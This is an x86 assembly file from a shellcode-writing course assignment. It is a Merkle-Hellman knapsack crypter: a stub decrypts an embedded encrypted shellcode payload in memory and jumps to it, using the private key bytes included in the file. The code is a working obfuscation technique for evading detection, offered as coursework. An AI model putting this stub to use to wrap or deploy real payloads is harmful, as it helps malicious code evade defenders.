; Author :      Demey Alexandre (PA-14186)
; Date :        13-05-2020
; 
; Description : SLAE assignment #7 - Merkle-Hellman knapstack crypter
;
; Size : 84 bytes + 12 for the key + 2 x the original shellcode length


global _start
section .text

_start:
    jmp crypted             ; jmp/call/pop to get private key + encrypted shellcode address

get_nb:
    mov ax, [ebx+0xa]       ; pointer to modular inverse r
    mul word [esi]          ; r * encrypted byte value
    div word [ebx+0x8]      ; divide by q
    mov ax, dx              ; AX set to modulo q value (remainder)
    ret         

decrypt:                    ; Initialisation of some registers
    pop ebx                 ; pointer to the private key (w, q, modinv_r)
    lea edi, [ebx+12]       ; pointers to the encoded shellcode
    mov esi, edi            ;  - ESI used to read encrypted payload
                            ;  - EDI used to write decrypted payload
    xor ecx, ecx            
    mul ecx                 ; EAX,EDX,ECX set to 0
    mov cl, 0x15            ; 21 bytes (original shellcode length!!)

next_char:
    call get_nb             ; Set EAX to the next encrypted byte value
    push cx                 ; save bytes counter 
    mov cl, 0x8             ; set bits counter
    add ebx, ecx            ; init EBX pointer, it will iterate through 'w'
                            ; from its last element to its first

next_bit:
    dec ebx                 ; EBX point from w[7] to w[0]
    cdq                     ; clear EDX
    mov dl, [ebx]           ; set DL to next 'w' element value
    cmp ax, dx              ; 
    clc                     ; Set CF = 0
    js next                 ; jump if DX > AX 
                            ; else AX composed of DX, so corresponding bit = 1
    sub ax, dx              ; substract DX from AX
    stc                     ; Set CF = 1
next:
    rcr ebp, 1              ; rotate EBP one byte to the right, 
                            ; insert CF value to the left
    dec cl                  ; decrease bits counter
    jnz next_bit            ; jump to next bit if cl > 0

    shr ebp, 24             ; set the decrypted byte in the 8 lower bits of EBP
    xchg ebp, edx           ; exchange EDX and EBP (decrpted byte in DL now)
    mov byte [edi], dl      ; copy DL to the memory pointed by EDI
    inc edi                 ; move EDI to the next mememory byte
    lea esi, [esi+2]        ; move ESI to the next encrypted bytes
    pop cx                  ; set CX to bytes counter value
    dec cx                  ; decrease bytes counter
    jnz next_char           ; jump to next char if CX > 0

    jmp payload             ; Jump to decrypted payload
    
crypted:
    call decrypt
    key: db 0x01,0x03,0x06,0x0c,0x18,0x2f,0x5e,0xbd,0xe8,0x02,0xd7,0x00
    payload: db 0x69,0x03,0xf7,0x04,0x10,0x07,0xe9,0x03,0xe1,0x00,0xef,0x01,0x62,0x04,0x90,0x06,0x40,0x04,0xef,0x01,0xef,0x01,0x90,0x06,0x90,0x06,0x31,0x01,0x4a,0x04,0xca,0x04,0x93,0x04,0x15,0x02,0x6d,0x04,0xc0,0x06,0x07,0x01
